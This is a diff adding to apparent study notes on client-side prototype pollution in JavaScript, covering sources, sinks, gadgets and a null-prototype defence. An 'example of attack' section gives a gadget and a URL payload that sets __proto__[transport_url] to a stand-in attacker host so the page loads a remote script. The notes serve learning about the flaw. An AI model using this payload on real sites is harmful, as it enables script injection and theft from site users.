@@ -27,5 +27,18 @@ source:A prototype pollution source is any user-controllable input that enables 
 url,json based input webmessages
 sink
 gadget
+->Robust websites may also explicitly set the prototype of the object to null, which ensures that it doesn't inherit any properties at all
 
 ```
+## example of attack
+```
+let transport_url = config.transport_url || defaults.transport_url;
+let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);
+now ''https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net''
+```
+## finding gadgets
+```
+console.trace() is useful for debuggeing purposes
+nice to read https://portswigger.net/web-security/prototype-pollution/client-side
